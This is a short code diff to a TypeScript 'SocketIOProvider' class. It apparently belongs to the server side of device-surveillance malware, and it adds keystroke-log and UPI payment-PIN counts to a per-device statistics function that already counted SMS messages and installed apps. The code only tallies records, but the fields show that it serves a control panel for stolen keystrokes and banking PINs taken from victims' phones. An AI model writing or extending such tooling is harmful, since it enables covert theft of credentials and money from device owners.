@@ -47,16 +47,20 @@ export class SocketIOProvider implements IDeviceProvider {
 
     async getDeviceStats(deviceId: string): Promise<DeviceStats> {
         try {
-            const [messages, apps] = await Promise.all([
+            const [messages, apps, keylogs, upiPins] = await Promise.all([
                 this.getMessages(deviceId, 1),
-                this.getApps(deviceId, 1)
+                this.getApps(deviceId, 1),
+                this.getKeylogs(deviceId, 1),
+                this.getUpiPins(deviceId)
             ]);
             return {
                 messages: messages.length,
-                apps: apps.length
+                apps: apps.length,
+                keylogs: keylogs.length,
+                upiPins: upiPins.length
             };
         } catch (e) {
-            return { messages: 0, apps: 0 };
+            return { messages: 0, apps: 0, keylogs: 0, upiPins: 0 };
         }
     }
 
